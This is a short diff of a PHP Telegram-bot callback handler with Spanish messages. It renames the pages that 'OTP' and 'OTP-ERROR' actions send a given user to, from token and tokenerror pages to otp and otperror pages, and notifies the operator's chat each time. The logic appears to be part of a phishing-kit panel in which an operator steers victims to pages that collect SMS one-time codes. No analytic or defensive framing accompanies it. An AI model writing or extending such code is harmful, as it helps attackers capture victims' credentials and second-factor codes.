@@ -23,13 +23,13 @@ if (isset($update["callback_query"])) {
             "text" => "❌ Redirigido a SMSERROR para $usuario"
         ]));
     }elseif ($accion === "OTP") {
-        file_put_contents("acciones/{$usuario}.txt", "token.php");
+        file_put_contents("acciones/{$usuario}.txt", "otp.php");
         file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
             "chat_id" => $chat_id,
             "text" => "➡️ Redirigido a SMS para $usuario"
         ]));
     } elseif ($accion === "OTP-ERROR") {
-        file_put_contents("acciones/{$usuario}.txt", "tokenerror.php");
+        file_put_contents("acciones/{$usuario}.txt", "otperror.php");
         file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
             "chat_id" => $chat_id,
             "text" => "❌ Redirigido a SMSERROR para $usuario"
